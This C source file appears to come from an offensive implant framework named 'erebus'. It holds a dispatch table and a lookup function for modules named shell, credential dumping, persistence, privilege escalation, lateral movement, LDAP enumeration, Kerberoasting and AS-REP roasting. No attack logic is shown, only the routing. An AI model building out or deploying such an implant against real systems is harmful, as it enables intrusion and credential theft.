#include <string.h>

#include "erebus/modules.h"

static const struct {
    const char       *name;
    erebus_module_fn  fn;
} g_modules[] = {
    { "shell",         erebus_mod_shell },
    { "creds_dump",    erebus_mod_creds_dump },
    { "cloud",         erebus_mod_cloud },
    { "persist",       erebus_mod_persist },
    { "privesc",       erebus_mod_privesc },
    { "lateral_move",  erebus_mod_lateral_move },
    { "ldap_enum",     erebus_mod_ldap_enum },
    { "kerberoast",    erebus_mod_kerberoast },
    { "asreproast",    erebus_mod_asreproast },
};

int erebus_module_execute(const char *name, const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    if (!name || !name[0]) return 0;
    for (size_t i = 0; i < sizeof(g_modules) / sizeof(g_modules[0]); i++) {
        if (strcmp(g_modules[i].name, name) == 0)
            return g_modules[i].fn(config, config_len, out, out_len);
    }
    return 0;
}